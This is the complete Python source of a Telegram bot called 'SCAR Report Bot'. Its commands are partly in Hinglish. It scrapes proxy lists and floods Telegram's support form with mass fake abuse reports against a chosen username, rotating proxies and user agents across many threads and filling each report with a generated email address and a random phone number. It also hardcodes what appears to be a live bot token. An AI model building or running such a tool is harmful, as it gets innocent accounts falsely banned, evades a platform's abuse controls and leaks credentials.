# bot.py — SCAR Report Bot
# Engine: telegram.org/support form flood via proxy rotation
# Bot: python-telegram-bot v20 async

import asyncio
import os
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from configparser import ConfigParser

import phonenumbers
import requests
from bs4 import BeautifulSoup
from emailtools import generate
from phonenumbers import PhoneNumberFormat
from random_user_agent.params import OperatingSystem, SoftwareName
from random_user_agent.user_agent import UserAgent
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
)

# ─────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────
BOT_TOKEN       = "9211433573:AAExVJD9hKDYa1pOSnxTzD-f3JZS_IYsaJo"
OWNER_ID        = 8956772022          # main owner — cannot be removed
ADMIN_IDS       = {8956772022}        # mutable set — addadmin/removeadmin se change hota hai
CONFIG_FILE     = "config.ini"
MESSAGE_FILE    = "message.txt"
THREADS         = 80
REQ_TIMEOUT     = 15
STATUS_INTERVAL = 4
# ─────────────────────────────────────────────────────────

PROXY_TYPES = ("http", "socks4", "socks5")

PROXY_REGEX = re.compile(
    r"(?:^|\D)?(((?:[1-9]|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
    r"\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
    r"\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])"
    r"\.(?:\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5]))"
    r":(?:\d|[1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}"
    r"|65[0-4]\d{2}|655[0-2]\d|6553[0-5]))(?:\D|$)"
)

_ua_rotator = UserAgent(
    software_names=[SoftwareName.CHROME.value, SoftwareName.FIREFOX.value,
                    SoftwareName.EDGE.value, SoftwareName.OPERA.value],
    operating_systems=[OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value,
                       OperatingSystem.MAC.value],
    limit=1200,
)


# ─────────────────────────────────────────────────────────
#  Session
# ─────────────────────────────────────────────────────────
class ReportSession:
    def __init__(self):
        self._lock   = threading.Lock()
        self._stop   = threading.Event()
        self.running = False
        self.success = 0
        self.failed  = 0
        self.target  = ""
        self.proxies = {t: [] for t in PROXY_TYPES}
        self.threads = THREADS

    def start(self, target: str):
        with self._lock:
            self.running = True
            self.success = 0
            self.failed  = 0
            self.target  = target
            self._stop.clear()

    def stop(self):
        self._stop.set()
        with self._lock:
            self.running = False

    def should_stop(self) -> bool:
        return self._stop.is_set()

    def ok(self):
        with self._lock:
            self.success += 1

    def err(self):
        with self._lock:
            self.failed += 1

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running": self.running,
                "success": self.success,
                "failed":  self.failed,
                "target":  self.target,
                "threads": self.threads,
                "proxies": sum(len(v) for v in self.proxies.values()),
                "http":    len(self.proxies["http"]),
                "socks4":  len(self.proxies["socks4"]),
                "socks5":  len(self.proxies["socks5"]),
            }


sess = ReportSession()


# ─────────────────────────────────────────────────────────
#  Proxy scraper
# ─────────────────────────────────────────────────────────
def _read_sources() -> dict:
    cfg = ConfigParser(interpolation=None)
    if not os.path.exists(CONFIG_FILE):
        return {t: [] for t in PROXY_TYPES}
    cfg.read(CONFIG_FILE, encoding="utf-8")
    out = {}
    for pt, key in (("http", "HTTP"), ("socks4", "SOCKS4"), ("socks5", "SOCKS5")):
        try:
            lines = cfg[key].get("Sources", "").splitlines()
            out[pt] = [l.strip() for l in lines if l.strip()]
        except KeyError:
            out[pt] = []
    return out


def _fetch_proxies_from(url: str, bucket: list):
    try:
        r = requests.get(url, timeout=REQ_TIMEOUT)
        for m in PROXY_REGEX.finditer(r.text):
            bucket.append(m.group(1))
    except Exception:
        pass


def scrape_all_proxies() -> dict:
    sources = _read_sources()
    results = {t: [] for t in PROXY_TYPES}
    threads = []
    for pt in PROXY_TYPES:
        for url in sources.get(pt, []):
            t = threading.Thread(
                target=_fetch_proxies_from,
                args=(url, results[pt]),
                daemon=True,
            )
            threads.append(t)
            t.start()
    for t in threads:
        t.join(timeout=30)
    for pt in PROXY_TYPES:
        results[pt] = list(set(results[pt]))
    return results


# ─────────────────────────────────────────────────────────
#  Report engine
# ─────────────────────────────────────────────────────────
def _load_messages() -> list[str]:
    if not os.path.exists(MESSAGE_FILE):
        return ["This account is violating Telegram's Terms of Service."]
    with open(MESSAGE_FILE, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f if l.strip()]
    return lines or ["ToS violation."]


def _random_phone() -> str:
    while True:
        cc  = f"+{random.randint(1, 999)}"
        nat = str(random.randint(1000000000, 9999999999))
        try:
            p = phonenumbers.parse(cc + nat)
            if phonenumbers.is_valid_number(p):
                return phonenumbers.format_number(p, PhoneNumberFormat.E164)
        except Exception:
            continue


def _single_report(proxy: str, proxy_type: str, target: str, messages: list[str]):
    if sess.should_stop():
        return
    url = "https://telegram.org/support"
    ua  = _ua_rotator.get_random_user_agent()
    px  = {
        "http":  f"{proxy_type}://{proxy}",
        "https": f"{proxy_type}://{proxy}",
    }
    try:
        r1   = requests.get(url, proxies=px, timeout=REQ_TIMEOUT, headers={"User-Agent": ua})
        soup = BeautifulSoup(r1.text, "html.parser")
        form = soup.find("form", action="/support")
        if not form:
            sess.err()
            return

        msg   = random.choice(messages).replace("{username}", target)
        email = generate("gmail")
        phone = _random_phone()

        data = {}
        for el in form.find_all(["input", "textarea"]):
            name = el.get("name")
            if not name:
                continue
            eid = el.get("id", "")
            if eid == "support_problem":
                data[name] = msg
            elif eid == "support_email":
                data[name] = email
            elif eid == "support_phone":
                data[name] = phone
            else:
                data[name] = el.get("value", "")

        r2 = requests.post(
            url, data=data, cookies=r1.cookies,
            proxies=px, timeout=REQ_TIMEOUT,
            headers={"User-Agent": ua},
        )
        if r2.status_code == 200:
            sess.ok()
        else:
            sess.err()
    except Exception:
        sess.err()


def _report_worker(target: str, messages: list[str]):
    while not sess.should_stop():
        pool_list = []
        for pt in PROXY_TYPES:
            for proxy in sess.proxies.get(pt, []):
                pool_list.append((proxy, pt))

        if not pool_list:
            time.sleep(3)
            continue

        random.shuffle(pool_list)

        with ThreadPoolExecutor(max_workers=sess.threads) as pool:
            futs = [
                pool.submit(_single_report, px, pt, target, messages)
                for px, pt in pool_list
                if not sess.should_stop()
            ]
            for f in futs:
                if sess.should_stop():
                    break
                try:
                    f.result(timeout=REQ_TIMEOUT + 5)
                except Exception:
                    pass

    with sess._lock:
        sess.running = False


# ─────────────────────────────────────────────────────────
#  Auth helpers
# ─────────────────────────────────────────────────────────
def _is_admin(update: Update) -> bool:
    return update.effective_user.id in ADMIN_IDS

def _is_owner(update: Update) -> bool:
    return update.effective_user.id == OWNER_ID


# ─────────────────────────────────────────────────────────
#  Text helpers
# ─────────────────────────────────────────────────────────
def _stats_text(s: dict, note: str = "") -> str:
    icon   = "🟢" if s["running"] else "🔴"
    status = "Running" if s["running"] else "Stopped"
    lines  = [
        f"{icon} *SCAR Report Bot — {status}*",
        "",
        f"🎯 Target   : `{s['target'] or '—'}`",
        f"⚡ Threads  : `{s['threads']}`",
        f"🌐 Proxies  : `{s['proxies']}` (H:`{s['http']}` S4:`{s['socks4']}` S5:`{s['socks5']}`)",
        f"✅ Success  : `{s['success']}`",
        f"❌ Failed   : `{s['failed']}`",
    ]
    if note:
        lines += ["", f"_{note}_"]
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────
#  Commands — general
# ─────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        await update.message.reply_text("⛔ Access Denied.")
        return
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 Scrape Proxies", callback_data="scrape"),
         InlineKeyboardButton("📊 Status",         callback_data="status")],
    ])
    await update.message.reply_text(
        "*⚔️ SCAR Report Bot*\n\n"
        "*General:*\n"
        "`/report @target` — flooding shuru\n"
        "`/stop` — band karo\n"
        "`/restart` — same target pe restart\n"
        "`/scrape` — proxies refresh\n"
        "`/status` — live stats\n"
        "`/proxies` — proxy breakdown\n"
        "`/setthreads 100` — thread count change\n\n"
        "*Admin:*\n"
        "`/addadmin <id>` — naya admin add\n"
        "`/removeadmin <id>` — admin hata\n"
        "`/admins` — admin list dekh\n"
        "`/broadcast <msg>` — sab admins ko message",
        parse_mode="Markdown",
        reply_markup=kb,
    )


async def cmd_scrape(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    msg = await update.message.reply_text("⏳ Scraping proxies…")
    loop = asyncio.get_event_loop()
    proxies = await loop.run_in_executor(None, scrape_all_proxies)
    sess.proxies = proxies
    total = sum(len(v) for v in proxies.values())
    await msg.edit_text(
        f"✅ *Proxies scraped!*\n\n"
        f"HTTP   : `{len(proxies['http'])}`\n"
        f"SOCKS4 : `{len(proxies['socks4'])}`\n"
        f"SOCKS5 : `{len(proxies['socks5'])}`\n"
        f"*Total  : {total}*",
        parse_mode="Markdown",
    )


async def cmd_report(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return

    if sess.running:
        await update.message.reply_text("⚠️ Pehle /stop maar.")
        return

    args = ctx.args
    if not args:
        await update.message.reply_text("Usage: `/report @username`", parse_mode="Markdown")
        return

    target = args[0].lstrip("@").replace("https://t.me/", "")

    total = sum(len(v) for v in sess.proxies.values())
    if total == 0:
        notice = await update.message.reply_text("⏳ Proxies nahi hain — scrape ho raha hai…")
        loop = asyncio.get_event_loop()
        px   = await loop.run_in_executor(None, scrape_all_proxies)
        sess.proxies = px
        total = sum(len(v) for v in px.values())
        if total == 0:
            await notice.edit_text("❌ Koi proxy nahi mila. config.ini check kar.")
            return
        await notice.delete()

    messages = _load_messages()
    sess.start(target)
    threading.Thread(target=_report_worker, args=(target, messages), daemon=True).start()

    status_msg = await update.message.reply_text(
        _stats_text(sess.snapshot(), "Starting…"),
        parse_mode="Markdown",
    )

    async def _live():
        while sess.running:
            await asyncio.sleep(STATUS_INTERVAL)
            try:
                await status_msg.edit_text(_stats_text(sess.snapshot()), parse_mode="Markdown")
            except Exception:
                pass
        try:
            await status_msg.edit_text(_stats_text(sess.snapshot(), "Job khatam."), parse_mode="Markdown")
        except Exception:
            pass

    asyncio.create_task(_live())


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    if not sess.running:
        await update.message.reply_text("Kuch chal nahi raha.")
        return
    sess.stop()
    await asyncio.sleep(1)
    await update.message.reply_text(
        _stats_text(sess.snapshot(), "Stopped."),
        parse_mode="Markdown",
    )


async def cmd_restart(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    last_target = sess.target
    if not last_target:
        await update.message.reply_text("Koi previous target nahi. `/report @target` use kar.", parse_mode="Markdown")
        return
    if sess.running:
        sess.stop()
        await asyncio.sleep(1)

    messages = _load_messages()
    sess.start(last_target)
    threading.Thread(target=_report_worker, args=(last_target, messages), daemon=True).start()

    status_msg = await update.message.reply_text(
        _stats_text(sess.snapshot(), f"Restarted on {last_target}"),
        parse_mode="Markdown",
    )

    async def _live():
        while sess.running:
            await asyncio.sleep(STATUS_INTERVAL)
            try:
                await status_msg.edit_text(_stats_text(sess.snapshot()), parse_mode="Markdown")
            except Exception:
                pass
        try:
            await status_msg.edit_text(_stats_text(sess.snapshot(), "Job khatam."), parse_mode="Markdown")
        except Exception:
            pass

    asyncio.create_task(_live())


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    await update.message.reply_text(_stats_text(sess.snapshot()), parse_mode="Markdown")


async def cmd_proxies(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    s = sess.snapshot()
    await update.message.reply_text(
        f"*Proxy Breakdown*\n\n"
        f"HTTP   : `{s['http']}`\n"
        f"SOCKS4 : `{s['socks4']}`\n"
        f"SOCKS5 : `{s['socks5']}`\n"
        f"*Total  : {s['proxies']}*",
        parse_mode="Markdown",
    )


async def cmd_setthreads(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    args = ctx.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: `/setthreads 100`", parse_mode="Markdown")
        return
    n = int(args[0])
    if n < 1 or n > 500:
        await update.message.reply_text("1 se 500 ke beech rakh.")
        return
    sess.threads = n
    await update.message.reply_text(f"✅ Threads set to `{n}`", parse_mode="Markdown")


# ─────────────────────────────────────────────────────────
#  Commands — admin management (owner only)
# ─────────────────────────────────────────────────────────
async def cmd_addadmin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update):
        await update.message.reply_text("⛔ Sirf owner kar sakta hai.")
        return
    args = ctx.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: `/addadmin 123456789`", parse_mode="Markdown")
        return
    uid = int(args[0])
    if uid in ADMIN_IDS:
        await update.message.reply_text(f"`{uid}` pehle se admin hai.", parse_mode="Markdown")
        return
    ADMIN_IDS.add(uid)
    await update.message.reply_text(f"✅ `{uid}` admin ban gaya.", parse_mode="Markdown")


async def cmd_removeadmin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update):
        await update.message.reply_text("⛔ Sirf owner kar sakta hai.")
        return
    args = ctx.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: `/removeadmin 123456789`", parse_mode="Markdown")
        return
    uid = int(args[0])
    if uid == OWNER_ID:
        await update.message.reply_text("⛔ Owner ko nahi hata sakte.")
        return
    if uid not in ADMIN_IDS:
        await update.message.reply_text(f"`{uid}` admin hai hi nahi.", parse_mode="Markdown")
        return
    ADMIN_IDS.discard(uid)
    await update.message.reply_text(f"✅ `{uid}` hataya gaya.", parse_mode="Markdown")


async def cmd_admins(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_admin(update):
        return
    lines = ["*Admin List:*\n"]
    for uid in sorted(ADMIN_IDS):
        tag = " 👑 _(owner)_" if uid == OWNER_ID else ""
        lines.append(f"• `{uid}`{tag}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _is_owner(update):
        await update.message.reply_text("⛔ Sirf owner broadcast kar sakta hai.")
        return
    if not ctx.args:
        await update.message.reply_text("Usage: `/broadcast message yahan`", parse_mode="Markdown")
        return
    text = " ".join(ctx.args)
    sent, failed = 0, 0
    for uid in list(ADMIN_IDS):
        try:
            await ctx.bot.send_message(chat_id=uid, text=f"📢 *Broadcast:*\n\n{text}", parse_mode="Markdown")
            sent += 1
        except Exception:
            failed += 1
    await update.message.reply_text(f"✅ Sent: `{sent}` | ❌ Failed: `{failed}`", parse_mode="Markdown")


# ─────────────────────────────────────────────────────────
#  Callback buttons
# ─────────────────────────────────────────────────────────
async def cb_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.data == "scrape":
        await q.message.reply_text("⏳ /scrape command maar")
    elif q.data == "status":
        await q.message.reply_text(_stats_text(sess.snapshot()), parse_mode="Markdown")


# ─────────────────────────────────────────────────────────
#  Entry
# ─────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # general
    app.add_handler(CommandHandler("start",        cmd_start))
    app.add_handler(CommandHandler("scrape",       cmd_scrape))
    app.add_handler(CommandHandler("report",       cmd_report))
    app.add_handler(CommandHandler("stop",         cmd_stop))
    app.add_handler(CommandHandler("restart",      cmd_restart))
    app.add_handler(CommandHandler("status",       cmd_status))
    app.add_handler(CommandHandler("proxies",      cmd_proxies))
    app.add_handler(CommandHandler("setthreads",   cmd_setthreads))

    # admin management (owner only)
    app.add_handler(CommandHandler("addadmin",     cmd_addadmin))
    app.add_handler(CommandHandler("removeadmin",  cmd_removeadmin))
    app.add_handler(CommandHandler("admins",       cmd_admins))
    app.add_handler(CommandHandler("broadcast",    cmd_broadcast))

    app.add_handler(CallbackQueryHandler(cb_handler))
    print("[SCAR] Bot polling...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
